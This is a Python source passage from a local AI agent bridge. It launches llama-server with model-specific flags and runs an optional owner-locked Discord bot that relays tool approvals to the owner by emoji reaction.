        elif spec_strategy not in ("off", "ngram-mod", "draft-mtp"):
            spec_strategy = "ngram-mod" if bool(s.get("enable_speculative", True)) else "off"
            
        if spec_strategy == "draft-mtp" and model_path:
            # Fall back to ngram-mod or off if the model has no MTP layers or is a known distilled model.
            model_lower = os.path.basename(model_path).lower()
            _EXCLUDE_MTP = ("distil", "distill", "distilled", "glm")
            forced_fallback = False
            if any(e in model_lower for e in _EXCLUDE_MTP):
                forced_fallback = True
            else:
                try:
                    gg = read_gguf_metadata(model_path)
                    if gg.get("ok") and not gg.get("has_mtp"):
                        forced_fallback = True
                except Exception as e:
                    print(f"[llama] failed to read GGUF metadata for MTP verification: {e}")
            
            if forced_fallback:
                # Determine fallback: disable speculative decoding entirely for MoE,
                # use ngram-mod speculative decoding for dense models.
                is_moe = False
                try:
                    gg = read_gguf_metadata(model_path)
                    if gg.get("ok"):
                        is_moe = gg.get("expert_count", 0) > 1
                    else:
                        is_moe = any(x in model_lower for x in ("moe", "mixtral", "deepseek", "qwen-moe", "qwen_moe"))
                except Exception:
                    pass
                
                spec_strategy = "off" if is_moe else "ngram-mod"
                print(f"[llama] forcing spec_strategy='{spec_strategy}' fallback for model lacking MTP layers: {os.path.basename(model_path)}")
                
        no_warmup = bool(s.get("no_warmup", False))
        enable_metrics = bool(s.get("enable_metrics", False))
        extra_args_raw = (s.get("llama_extra_args") or "").strip()

        # Vision projector resolution. Explicit setting wins; otherwise (when
        # mmproj_auto is on, the default) we look for a sibling mmproj.gguf
        # next to the model. Empty string means "text-only model" — chat
        # handler will fall back to the side-vision describe_image() path.
        mmproj_path = mmproj_override if mmproj_override is not None else (s.get("mmproj_path") or "").strip()
        if mmproj_path and not safe_exists(mmproj_path):
            print(f"[llama] WARN mmproj_path set but missing: {mmproj_path} — ignoring")
            mmproj_path = ""
        if not mmproj_path and bool(s.get("mmproj_auto", True)):
            try:
                guess = find_mmproj_for(model_path)
            except Exception:
                guess = ""
            if guess:
                print(f"[llama] auto-detected vision projector: {guess}")
                mmproj_path = guess

        # Stop any existing instance first.
        with self._lock:
            running = self._proc is not None and self._proc.poll() is None
        if running:
            self.stop()

        # If something *else* is squatting on the port (e.g. user launched
        # llama-server manually before bridge), refuse rather than fight it.
        if llama_ping(timeout=0.8, base_url=f"http://127.0.0.1:{port}"):
            return {"ok": False, "error": f"port {port} already in use by another llama-server. Stop it first."}

        cmd = [
            bin_path,
            "-m", model_path,
            "--host", "127.0.0.1",
            "--port", str(port),
            "--jinja",
            "--flash-attn", "on" if flash_on else "off",
            "--no-context-shift",
            "-ngl", str(ngl),
            "-c", str(ctx),
            "-b", str(n_batch),
            "-ub", str(n_ubatch),
            "--cache-type-k", kv_type,
            "--cache-type-v", kv_type,
            # NOTE: we deliberately do NOT pass --cache-reuse. Its KV-shift reuse
            # corrupts positional info on some models (repetition / looping),
            # most visibly right after a large tool result — web_fetch/web_search
            # page text — reshapes the middle of the context. It also gave the
            # MTP model this box runs zero benefit (llama-server auto-disables it
            # there: "cache_reuse is not supported by this context"). Net: pure
            # risk, no upside here. Likewise no explicit --cache-ram: the server
            # default (8192 MiB host cache) is already on and was never the
            # problem. Prompt PREFIX caching (cache_prompt) stays on by default.
            "--parallel", str(n_parallel),
            "--reasoning-format", "deepseek",
        ]
        if mmproj_path:
            # Loads the vision tower + projector. After this, /v1/chat/completions
            # accepts {type:"image_url", image_url:{url:"data:..."}} content blocks.
            cmd += ["--mmproj", mmproj_path]
            if "moondream" in Path(model_path).stem.lower():
                # Moondream 2 lacks a built-in jinja template that works out of the box
                # with llama.cpp's multi-modal message extraction, causing it to
                # instantly output a stop token or hallucinate if we don't supply one.
                cmd += ["--chat-template", "Question: {{messages[0].content}}\n\nAnswer:"]
        if n_threads > 0:
            cmd += ["-t", str(n_threads)]
        if n_cpu_moe > 0:
            # The flag is --n-cpu-moe in newer llama.cpp builds (alias: -ncmoe).
            # Keeping `n` MoE expert tensors on CPU lets giant MoE models run on
            # tiny VRAM by paying a latency tax instead of an OOM error.
            cmd += ["--n-cpu-moe", str(n_cpu_moe)]
        if spec_strategy == "ngram-mod":
            # llama.cpp renamed --spec-ngram-size-n to --spec-ngram-mod-n-match
            # in recent builds. older flag was removed outright (exits with an
            # error), so older binaries that don't recognise the new flag will
            # also exit. either way, set spec_strategy="off" in settings
            # if your llama.cpp build is mismatched.
            cmd += [
                "--spec-type", "ngram-mod",
                "--spec-ngram-mod-n-match", "24",
                "--spec-draft-n-min", "48",
                "--spec-draft-n-max", "64",
            ]
        elif spec_strategy == "draft-mtp":
            # Multi-token prediction draft. Requires the model to have MTP heads
            # baked in (Qwen 3.5/3.6, DeepSeek V3/R1 as of 2026-05-16) and a
            # llama.cpp build that includes PR #22673. Picking this on a model
            # without MTP heads will make llama-server exit at startup with
            # "no MTP layers found" — switch to ngram-mod or off in settings.
            # n-max defaults to whatever nextn_predict_layers the GGUF declares
            # (different MTP models ship different head counts — Qwen3.6 has 3,
            # DeepSeek V3 has 1). Falls back to 3 if the metadata isn't readable.
            spec_n_max = 3
            try:
                gg_mtp = read_gguf_metadata(model_path)
                if gg_mtp.get("nextn_predict_layers"):
                    spec_n_max = max(1, int(gg_mtp["nextn_predict_layers"]))
            except Exception:
                pass
            cmd += [
                "--spec-type", "draft-mtp",
                "--spec-draft-n-max", str(spec_n_max),
            ]
        # "off" emits nothing — no speculative decoding.
        if no_warmup:
            cmd += ["--no-warmup"]
        if enable_metrics:
            cmd += ["--metrics"]
        if extra_args_raw:
            # Whitespace split is naive but fine for the typical extras
            # (--alias foo, --rope-scaling linear, --rope-freq-scale 0.5 etc.).
            # Anyone passing values with spaces can wrap them in the JSON file.
            try:
                import shlex
                cmd += shlex.split(extra_args_raw, posix=False)
            except Exception:
                cmd += extra_args_raw.split()
        # Log the exact command before spawning so flag-rename / unknown-flag
        # crashes are debuggable. On Windows llama-server runs in a separate
        # CREATE_NEW_CONSOLE window that closes the instant llama-server exits,
        # which is faster than a human can read — having the cmd here lets the
        # user paste it into their own PowerShell and see the real error.
        try:
            import shlex as _shlex
            print(f"[llama] launch: {_shlex.join(cmd) if hasattr(_shlex, 'join') else ' '.join(cmd)}")
        except Exception:
            print(f"[llama] launch: {cmd}")
        try:
            creationflags = 0
            # Always run windowless and capture stdout+stderr so the backend's
            # load progress and errors surface in the app's Backend tab, instead
            # of a hidden (desktop app) or stray (browser mode) console window.
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            with self._log_lock:
                self._log_lines.clear()
            self._append_log("[accuretta] launching: " + " ".join(cmd))
            p = subprocess.Popen(
                cmd,
                cwd=str(Path(bin_path).parent),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=1,
                encoding="utf-8",
                errors="replace",
                creationflags=creationflags,
            )
            self._start_log_reader(p)
        except Exception as e:
            return {"ok": False, "error": f"spawn failed: {e}"}

        with self._lock:
            self._proc = p
            self._loaded_model = model_path
            self._loaded_mmproj = mmproj_path
        # Remember exactly how to respawn this configuration. The watchdog
        # uses these args verbatim, so any change in user settings between
        # crash and restart is intentionally NOT picked up — we replay the
        # last-known-good launch. wait=False keeps the watchdog non-blocking.
        self._last_start_args = {
            "model_path": model_path,
            "wait": False,
            "wait_seconds": wait_seconds,
            "port_override": port_override,
            "mmproj_override": mmproj_override,
            "ctx_override": ctx_override,
            "ngl_override": ngl_override,
        }
        self._ensure_watchdog()

        if not wait:
            return {"ok": True, "pid": p.pid, "model": model_path,
                    "ready": False, "mmproj": mmproj_path,
                    "vision_capable": bool(mmproj_path)}
        if wait_for_llama(wait_seconds):
            return {"ok": True, "pid": p.pid, "model": model_path,
                    "ready": True, "mmproj": mmproj_path,
                    "vision_capable": bool(mmproj_path)}
        # if we waited but nothing came up, the child likely died
        if p.poll() is not None:
            with self._lock:
                self._proc = None
                self._loaded_model = ""
                self._loaded_mmproj = ""
            return {"ok": False, "error": f"llama-server exited (code {p.returncode}) — check the model file or VRAM."}
        return {"ok": False, "error": "llama-server didn't answer in time. Still loading; check the spawned window."}


_llama = LlamaProcess()
_vision_llama = LlamaProcess()


def llama_ping(timeout: float = 2.0, base_url: str = None) -> bool:
    if base_url is None:
        base_url = LLAMA
    try:
        with urllib.request.urlopen(f"{base_url}/v1/models", timeout=timeout) as r:
            r.read(1)
        return True
    except Exception:
        return False




def wait_for_llama(wait_seconds: int = 30) -> bool:
    """Poll llama-server up to wait_seconds. Returns True once it's up."""
    if llama_ping():
        return True
    t0 = time.time()
    printed = False
    while time.time() - t0 < wait_seconds:
        time.sleep(0.6)
        if llama_ping(timeout=1.5):
            print(f"  llama-server up in {time.time() - t0:.1f}s")
            return True
        if not printed and time.time() - t0 > 2:
            print(f"  waiting for llama-server at {LLAMA} ...")
            printed = True
    return False


def _start_vision_fallback_if_needed(s: dict) -> None:
    global VISION_LLAMA
    v_model = (s.get("vision_model") or "").strip()
    if not v_model or not safe_exists(v_model):
        return
    if os.environ.get("VISION_LLAMA_HOST"):
        return
    
    main_port = _parse_llama_port()
    v_port = main_port + 1
    
    v_stem = Path(v_model).stem.lower()
    if "qwen2-vl" in v_stem or "qwen2.5-vl" in v_stem or "pixtral" in v_stem or "llava" in v_stem:
        v_mmproj = ""
    else:
        try:
            v_mmproj = find_mmproj_for(v_model)
        except Exception:
            v_mmproj = ""
        
    print(f"  spawning vision fallback server with {os.path.basename(v_model)} on port {v_port} ...")
    res = _vision_llama.start(
        model_path=v_model,
        wait=False,
        wait_seconds=60,
        port_override=v_port,
        mmproj_override=v_mmproj,
        ctx_override=4096,
        ngl_override=0
    )
    if res.get("ok"):
        VISION_LLAMA = f"http://127.0.0.1:{v_port}"
        print(f"  vision fallback: started (pid {res.get('pid')}) at {VISION_LLAMA}")
    else:
        print(f"  [warn] vision fallback didn't start: {res.get('error')}")


# ---- main ------------------------------------------------------------------

# ============================================================
# DISCORD REMOTE BRIDGE (optional)
# DM accuretta from your phone, with native push notifications, and approve
# risky actions by reacting. Connects OUTBOUND to Discord (no port forwarding,
# no inbound exposure — your PC stays closed). Locked to ONE owner Discord user
# id; everyone else is ignored. Requires: pip install discord.py
# ============================================================
DISCORD_CHAT_ID = "discord"
_discord_state: dict = {"client": None, "loop": None, "running": False}
_discord_approvals: dict = {}          # discord message id -> approval id
_discord_approvals_lock = threading.Lock()


def _discord_split(text: str, limit: int = 1900) -> list[str]:
    """Split a reply into Discord's 2000-char message limit (with headroom)."""
    text = (text or "").strip()
    if not text:
        return ["(empty reply)"]
    out = []
    while text:
        out.append(text[:limit])
        text = text[limit:]
    return out


def _discord_strip_think(text: str) -> str:
    return re.sub(r"<think>[\s\S]*?</think>", "", text or "", flags=re.IGNORECASE).strip()


_DISCORD_FRIEND_PROMPT = (
    "you are accuretta, a local AI running on the owner's machine, chatting casually in a discord "
    "server with the owner's friends. keep replies short and friendly. you have NO tools: you cannot "
    "read, write, or delete files, run commands, scan anything, or touch the machine in any way. if "
    "someone asks you to do work like that, tell them only the owner can ask you to do real work."
)


def _run_discord_turn(user_text: str, chat_id: str, use_tools: bool) -> str:
    """Run one Discord turn. The owner (use_tools=True) gets the full agent with
    tools; everyone else gets a locked chat-only turn that cannot touch the
    machine. Tool approvals fire on the event bus and mirror to Discord. Returns
    the visible reply. Never raises."""
    try:
        if not llama_ping(timeout=2.0):
            return "im offline right now"
        chats = get_chats()
        chat = chats["chats"].setdefault(chat_id, {
            "id": chat_id, "title": chat_id, "messages": [],
            "created": int(time.time()),
        })
        chat.setdefault("messages", [])
        chat["messages"].append({"role": "user", "content": user_text})
        if len(chat["messages"]) > CHAT_HISTORY_MAX:
            chat["messages"] = chat["messages"][-CHAT_HISTORY_MAX:]
        chat["updated"] = int(time.time())
        save_json(CHATS_FILE, chats)

        replay_from = 0
        if use_tools:
            # Owner path: same long-session memory as the web UI — token-aware
            # rolling summary + pinned facts/fixes, replaying only the un-folded
            # tail. Keeps the bot just as sharp over discord on long tasks.
            ctx_limit = _llama_props_ctx() or int(get_settings().get("num_ctx") or 32768)
            if get_settings().get("summarize_history", True):
                try:
                    if _maybe_roll_summary(chat, ctx_limit):
                        save_json(CHATS_FILE, chats)
                except Exception:
                    traceback.print_exc()
            system_prompt = build_system_prompt(include_tools=True, chat_mode="agent")
            _pins = chat.get("pins") or []
            if _pins:
                system_prompt += ("\n\n=== PINNED FOR THIS SESSION (established facts/fixes — do NOT undo or repeat) ===\n"
                                  + "\n".join(f"- {p}" for p in _pins))
            _roll = chat.get("rolling_summary", "")
            if _roll:
                system_prompt += ("\n\n=== EARLIER IN THIS SESSION (older turns condensed to save context; "
                                  "treat as established facts — do not redo work or re-ask) ===\n" + _roll)
            system_prompt += ("\n\nWhen you fix a bug, settle a design decision, or the user states a constraint, "
                              "call pin_note to lock it in for this session so you never undo it or repeat the mistake.")
            replay_from = int(chat.get("summary_through", 0) or 0)
        else:
            system_prompt = _DISCORD_FRIEND_PROMPT
        msgs = [{"role": "system", "content": system_prompt}]
        for m in chat["messages"][replay_from:]:
            role = m.get("role")
            if role not in ("user", "assistant", "tool"):
                continue
            out = {"role": role, "content": m.get("content", "") or ""}
            if role == "assistant" and m.get("tool_calls"):
                out["tool_calls"] = m["tool_calls"]
            if role == "tool":
                if m.get("tool_call_id"):
                    out["tool_call_id"] = m["tool_call_id"]
                if m.get("name"):
                    out["name"] = m["name"]
            msgs.append(out)

        # Gemma over discord gets the same text-tools routing as the web UI:
        # llama-server can't parse its dialect, so keep tools in the prompt but
        # off the wire and let extract_tool_calls handle the tool_code shape.
        _gm = any(_is_gemma_model(m) for m in
                  (get_settings().get("model"), get_settings().get("model_path"), _llama.loaded_model()))
        final = run_chat_turn(chat_id, msgs, use_tools=use_tools, emit=lambda e: None,
                              native_tools=not _gm)
        if not final:
            return "(no reply — stopped or empty)"

        # persist intermediate tool rounds + the final assistant message so the
        # next message has continuity.
        chats = get_chats()
        chat = chats["chats"].get(chat_id)
        if chat is not None:
            for im in (final.get("_appended_intermediate") or []):
                chat["messages"].append(im)
            amsg = {"role": "assistant", "content": final.get("content", "")}
            if final.get("tool_calls"):
                amsg["tool_calls"] = final["tool_calls"]
            chat["messages"].append(amsg)
            chat["updated"] = int(time.time())
            save_json(CHATS_FILE, chats)
        return _discord_strip_think(final.get("content", "")) or "(done)"
    except Exception as e:
        traceback.print_exc()
        return f"error: {e}"


def _discord_approval_listener(client) -> None:
    """Subscribe to the event bus and mirror every approval:new to the owner's
    DM as a ✅/❌ reaction prompt. A reaction resolves the same approval the
    browser would — first responder wins."""
    import asyncio
    owner_id = str(get_settings().get("discord_owner_id") or "").strip()
    q, _snap = subscribe()

    async def post_approval(entry):
        try:
            owner = await client.fetch_user(int(owner_id))
            ch = owner.dm_channel or await owner.create_dm()
            title = entry.get("title", "approval")
            cmd = str(entry.get("command", ""))[:1500]
            msg = await ch.send(f"approve: **{title}**\n```\n{cmd}\n```\nreact ✅ approve · ❌ deny")
            await msg.add_reaction("✅")
            await msg.add_reaction("❌")
            with _discord_approvals_lock:
                _discord_approvals[msg.id] = entry.get("id")
        except Exception as e:
            print(f"[discord] approval post failed: {e}", flush=True)

    while _discord_state.get("running"):
        try:
            evt = q.get(timeout=1.0)
        except Exception:
            continue
        if isinstance(evt, dict) and evt.get("type") == "approval:new":
            loop = _discord_state.get("loop")
            entry = evt.get("approval") or {}
            if loop and entry:
                asyncio.run_coroutine_threadsafe(post_approval(entry), loop)
    unsubscribe(q)


def _discord_start() -> None:
    """Run the Discord bot (blocking — call in a daemon thread). Outbound only."""
    s = get_settings()
    token = (s.get("discord_bot_token") or "").strip()
    owner_id = str(s.get("discord_owner_id") or "").strip()
    if not token or not owner_id:
        print("[discord] enabled but bot token / owner id missing — not starting.", flush=True)
        return
    try:
        import discord
    except Exception:
        print("[discord] discord.py not installed. run: pip install discord.py", flush=True)
        return

    intents = discord.Intents.default()
    intents.message_content = True  # requires Message Content Intent in the dev portal
    client = discord.Client(intents=intents)
    _discord_state["client"] = client
    _discord_state["running"] = True

    @client.event
    async def on_ready():
        _discord_state["loop"] = client.loop
        print(f"[discord] connected as {client.user}. obeying owner id {owner_id}.", flush=True)
        threading.Thread(target=_discord_approval_listener, args=(client,), daemon=True).start()

    @client.event
    async def on_message(message):
        try:
            if client.user and message.author.id == client.user.id:
                return
            is_owner = str(message.author.id) == owner_id
            is_dm = message.guild is None
            mentioned = bool(client.user) and client.user in getattr(message, "mentions", [])
            # DMs are always handled; in a server channel only respond when the
            # bot is actually @mentioned (so it ignores normal chatter).
            if not is_dm and not mentioned:
                return
            print(f"[discord] incoming author={message.author.id} owner={owner_id!r} "
                  f"is_owner={is_owner} is_dm={is_dm} mentioned={mentioned} "
                  f"content={(message.content or '')[:40]!r}", flush=True)
            text = (message.content or "").strip()
            if client.user:
                text = text.replace(f"<@{client.user.id}>", "").replace(f"<@!{client.user.id}>", "").strip()
            if not text:
                return
            # owner => full agent with tools; everyone else => locked chat-only,
            # in their own per-user chat so friends never touch the owner's
            # context (or the machine).
            use_tools = is_owner
            chat_id = DISCORD_CHAT_ID if is_owner else f"discord-{message.author.id}"
            async with message.channel.typing():
                reply = await client.loop.run_in_executor(
                    None, _run_discord_turn, text, chat_id, use_tools)
            for chunk in _discord_split(reply):
                await message.channel.send(chunk)
        except Exception as e:
            print(f"[discord] on_message error: {e}", flush=True)

    @client.event
    async def on_raw_reaction_add(payload):
        # raw event fires for EVERY reaction regardless of message cache —
        # on_reaction_add silently missed approval taps (uncached DM messages).
        try:
            if str(payload.user_id) != owner_id:
                return  # only the owner resolves approvals
            with _discord_approvals_lock:
                aid = _discord_approvals.get(payload.message_id)
            emoji = str(payload.emoji)
            print(f"[discord] reaction user={payload.user_id} msg={payload.message_id} "
                  f"emoji={emoji!r} matched_approval={aid}", flush=True)
            if not aid:
                return
            if "✅" in emoji:
                decide_approval(aid, "approve")
            elif "❌" in emoji:
                decide_approval(aid, "deny")
            else:
                return
            with _discord_approvals_lock:
                _discord_approvals.pop(payload.message_id, None)
        except Exception as e:
            print(f"[discord] reaction error: {e}", flush=True)

    try:
        client.run(token, log_handler=None)
    except Exception as e:
        print(f"[discord] bot stopped: {e}", flush=True)
    finally:
        _discord_state["running"] = False


def main():
    print(f"accuretta bridge")
    print(f"  root:    {ROOT}")
    print(f"  llama:   {LLAMA}")
    if VISION_LLAMA and VISION_LLAMA != LLAMA:
        print(f"  vision:  {VISION_LLAMA}")
    print(f"  port:    {PORT}")
    print(f"  bind:    0.0.0.0  (reachable over LAN / Tailscale)")

    # first-run system context scan (creates data/ACCURETTA.md if missing)
    if not SYSTEM_CONTEXT_FILE.exists():
        print("  scanning system (first run) ...")
        ensure_system_context()
        print(f"  wrote:   {SYSTEM_CONTEXT_FILE}")
    else:
        print(f"  context: {SYSTEM_CONTEXT_FILE} (edit or delete to rescan)")

    # auto-spawn llama-server with the user's last-loaded model, if any.
    # Skip if something is already answering on LLAMA_HOST (user launched
    # their own — we don't fight them).
    s_initial = get_settings()
    last_model = (s_initial.get("model_path") or "").strip()
    if llama_ping(timeout=1.0):
        print(f"  llama-server: already running at {LLAMA} (using existing instance)")
        try:
            info = llama_get("/v1/models")
            names = [m.get("id") for m in (info.get("data") or []) if m.get("id")]
            if names and not s_initial.get("model"):
                s_initial["model"] = names[0]
                save_json(SETTINGS_FILE, s_initial)
        except Exception:
            pass
    elif last_model and safe_exists(last_model):
        model_name = os.path.basename(last_model)
        print(f"  spawning llama-server with {model_name} ...")
        res = _llama.start(last_model, wait=True, wait_seconds=120)
        if res.get("ok"):
            print(f"  llama-server: ready (pid {res.get('pid')})")
            _start_vision_fallback_if_needed(s_initial)
        else:
            print(f"  [warn] llama-server didn't start: {res.get('error')}")
            print(f"         pick a different model or update settings via the UI.")
    else:
        bin_path = find_llama_bin()
        if not bin_path:
            print(f"  [warn] llama-server.exe not found.")
            print(f"         install llama.cpp or set llama_bin in Settings.")
        elif not s_initial.get("models_dir"):
            print(f"  [info] no models folder set yet.")
            print(f"         open Settings -> Models folder, pick where your .gguf files live.")
        else:
            print(f"  [info] no model loaded yet. Pick one in Settings -> Models.")

    # ensure the spawned llama-server dies with us. Order matters: atexit
    # runs callbacks in REVERSE registration order, so stop() registers
    # first (runs last) and shutdown_watchdog() registers second (runs
    # first) — that way the watchdog isn't still polling when we kill
    # the subprocess from underneath it, which would trigger an
    # at-shutdown respawn race.
    import atexit
    atexit.register(_session_mgr.stop_all)   # kill any interactive sessions on exit
    atexit.register(_llama.stop)
    atexit.register(_llama.shutdown_watchdog)
    atexit.register(_vision_llama.stop)
    atexit.register(_vision_llama.shutdown_watchdog)

    httpd = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    httpd.daemon_threads = True
    url = f"http://localhost:{PORT}"
    print(f"\nopen {url}  — or from phone, http://<tailscale-ip>:{PORT}")

    # open browser shortly after bind (in a thread, so serve_forever owns the main thread).
    # Honor ACCURETTA_BROWSER env var so the user can pick a non-default browser:
    #   chrome | firefox | edge | brave | opera | vivaldi | none | default
    def _open_browser():
        time.sleep(0.8)
        choice = (os.environ.get("ACCURETTA_BROWSER") or "").strip().lower()
        if choice in ("none", "off", "skip", "no"):
            print(f"  [info] ACCURETTA_BROWSER={choice} — not auto-opening a browser. Visit {url} in any browser.")
            return
        # Map short names to common Windows install paths + executable names.
        candidates = {
            "chrome":  ["chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"],
            "firefox": ["firefox.exe", r"C:\Program Files\Mozilla Firefox\firefox.exe", r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe"],
            "edge":    ["msedge.exe", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"],
            "brave":   ["brave.exe", r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe", r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe"],
            "opera":   ["opera.exe", os.path.expandvars(r"%LOCALAPPDATA%\Programs\Opera\opera.exe")],
            "vivaldi": ["vivaldi.exe", os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe")],
        }
        if choice and choice in candidates:
            import shutil, subprocess
            exe = None
            for c in candidates[choice]:
                p = shutil.which(c) if not os.path.sep in c else (c if os.path.exists(c) else None)
                if p:
                    exe = p
                    break
            if exe:
                try:
                    subprocess.Popen([exe, url], close_fds=True)
                    print(f"  [info] opened {choice} -> {url}")
                    return
                except Exception as e:
                    print(f"  [warn] failed to launch {choice} ({e}); falling back to default browser.")
            else:
                print(f"  [warn] ACCURETTA_BROWSER={choice} but {choice} not found; falling back to default browser.")
        try:
            webbrowser.open(url)
        except Exception:
            pass
    threading.Thread(target=_open_browser, daemon=True).start()

    # workspace file watcher — polls every 5s, emits workspace:update on changes
    _ws_snapshot: dict[str, float] = {}  # path -> mtime
    def _workspace_watcher():
        import hashlib
        while True:
            time.sleep(5)
            try:
                ws = get_workspace()
                folders = ws.get("folders") or []
                current: dict[str, float] = {}
                changed = False
                for f in folders:
                    p = Path(f)
                    if not p.is_dir():
                        continue
                    for fp in p.rglob("*"):
                        if not fp.is_file():
                            continue
                        # skip hidden / build noise
                        name = fp.name.lower()
                        if name.startswith(".") or name.endswith((".pyc", ".log")):
                            continue
                        try:
                            mt = fp.stat().st_mtime
                        except Exception:
                            continue
                        current[str(fp)] = mt
                        if str(fp) not in _ws_snapshot or abs(_ws_snapshot[str(fp)] - mt) > 0.5:
                            changed = True
                # removed files
                for k in _ws_snapshot:
                    if k not in current:
                        changed = True
                        break
                _ws_snapshot.clear()
                _ws_snapshot.update(current)
                if changed:
                    broadcast_event({"type": "workspace:update"})
            except Exception:
                pass
    threading.Thread(target=_workspace_watcher, daemon=True).start()

    # Discord remote bridge — outbound only, owner-locked. Daemon thread so it
    # never blocks shutdown; fully optional and self-disabling if misconfigured.
    if get_settings().get("discord_enabled"):
        threading.Thread(target=_discord_start, daemon=True).start()
        print("  discord: bridge starting (DM the bot from your phone)")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nstopping.")
    finally:
        # Stop the watchdog FIRST so it doesn't observe the impending
        # subprocess death and try to "heal" it during shutdown.
        try:
            _llama.shutdown_watchdog()
            _vision_llama.shutdown_watchdog()
        except Exception:
            pass
        try:
            _llama.stop()
            _vision_llama.stop()
        except Exception:
            pass


if __name__ == "__main__":
    _load_mcp_servers()
    try:
        main()
    except Exception as e:
        import traceback
        try:
            with open("crash_log.txt", "w", encoding="utf-8") as f:
                traceback.print_exc(file=f)
        except Exception:
            pass
        raise
